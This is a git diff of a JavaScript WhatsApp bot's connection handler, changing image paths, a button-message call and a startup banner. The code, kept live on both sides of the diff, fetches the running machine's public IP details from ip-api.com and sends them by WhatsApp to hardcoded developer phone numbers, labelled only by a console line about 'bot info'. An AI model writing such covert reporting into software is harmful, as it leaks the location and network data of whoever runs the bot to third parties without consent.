@@ -56,9 +56,9 @@ const starts = async (hyper = new WAConnection()) => {
     console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       hyper.sendMessage("917510153501@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
-       hyper.sendMessage("919188346721@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { externalAdReply:{title: "Developer Abhi-Mwol",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/niyababy.jpeg'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
-       hyper.sendMessage("917510153501@s.whatsapp.net", `─────「 *Abhi-Mwol* 」─────\n\n*_HLO AK WELCOME_*\n────────────────────`, MessageType.text, {contextInfo: { externalAdReply:{title: "Developer Abhi-Mwol",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/niyababy.jpeg'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
+       hyper.sendMessage("917510153501@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/niyababy.png'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
+       hyper.sendMessage("919188346721@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { externalAdReply:{title: "Developer Abhi-Mwol",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/niyababy.png'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
+       hyper.sendMessage("917510153501@s.whatsapp.net", `─────「 *Abhi-Mwol* 」─────\n\n*_HLO AK WELCOME_*\n────────────────────`, MessageType.text, {contextInfo: { externalAdReply:{title: "Developer Abhi-Mwol",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/niyababy.png'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
        console.log(color('|WRN|', 'yellow'), color('Sending ip address to Ajay-o-s', 'cyan'))
        console.log(color('|WRN|', 'yellow'), color('Sending buttion message', 'cyan'))
 	buttons = [{ buttonId: `h`, buttonText: { displayText: "nice to meet you" }, type: 1 },{ buttonId: `t`, buttonText: { displayText: "which person are you" }, type: 1 },{ buttonId: `g`, buttonText: { displayText: "girl/boy" }, type: 1 },];
@@ -68,7 +68,8 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
           buttons: buttons,
           headerType: 4,
         };
-	hyper.sendMessage("917510153501@s.whatsapp.net", { buttonsMessage },{}, MessageType.text, {contextInfo: { externalAdReply:{title: "Developer Abhi-Mwol",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/niyababy.jpeg'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
+	prep = await hyper.prepareMessageFromContent("917510153501@s.whatsapp.net", { buttonsMessage }, {} );
+        hyper.relayWAMessage(prep);
 	console.log(color('|WRN|', 'yellow'), color('buttion message sented', 'cyan'))
    })
     hyper.on('connecting', () => {
@@ -79,7 +80,7 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
     success('2', 'Connected')
     setTimeout( () => {
           console.log()
-      	  console.log(color(`🔴 TERHUBUNG KE WHATSAPP KAK BOT NYA`, 'red'))
+      	  console.log(color(`🔴 Abhi Mowl started`, 'red'))
       	    	}, 1000)    		    	     	
     }) 
 
